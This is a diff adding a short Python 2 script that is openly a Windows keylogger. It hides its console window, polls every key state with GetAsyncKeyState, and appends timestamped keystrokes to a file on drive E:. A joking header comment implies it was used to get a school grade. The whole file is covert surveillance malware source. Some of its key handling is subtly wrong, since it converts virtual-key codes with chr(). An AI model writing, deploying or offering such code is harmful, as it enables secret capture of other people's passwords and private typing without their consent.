@@ -1,0 +1,54 @@
+# dont ask why and or how i got an A in bulgarian
+
+import ctypes
+import time
+import sys
+import os
+from datetime import datetime
+
+user32 = ctypes.windll.user32
+kernel32 = ctypes.windll.kernel32
+
+class Keylogger:
+    def __init__(self):
+        self.log_file = r"E:\keylog.txt"
+        self.start_time = time.time()
+    
+    def log_key(self, key_str):
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        entry = "[%s] %s" % (timestamp, key_str)
+        try:
+            f = open(self.log_file, "a")
+            f.write(entry + "\n")
+            f.close()
+        except:
+            pass
+    
+    def hide_console(self):
+        hwnd = kernel32.GetConsoleWindow()
+        user32.ShowWindow(hwnd, 0)
+    
+    def get_keys(self):
+        keys = []
+        for vk_code in range(8, 255):
+            if user32.GetAsyncKeyState(vk_code) & 0x8000:
+                try:
+                    key = chr(vk_code)
+                    keys.append(key)
+                except:
+                    keys.append("[%d]" % vk_code)
+        return keys
+    
+    def run(self):
+        self.hide_console()
+        print "Win7 Keylogger STARTED - Log: %s" % self.log_file
+        
+        while True:
+            captured = self.get_keys()
+            for key in captured:
+                self.log_key(key)
+            time.sleep(0.01)  # 100Hz polling
+
+if __name__ == "__main__":
+    kl = Keylogger()
+    kl.run()
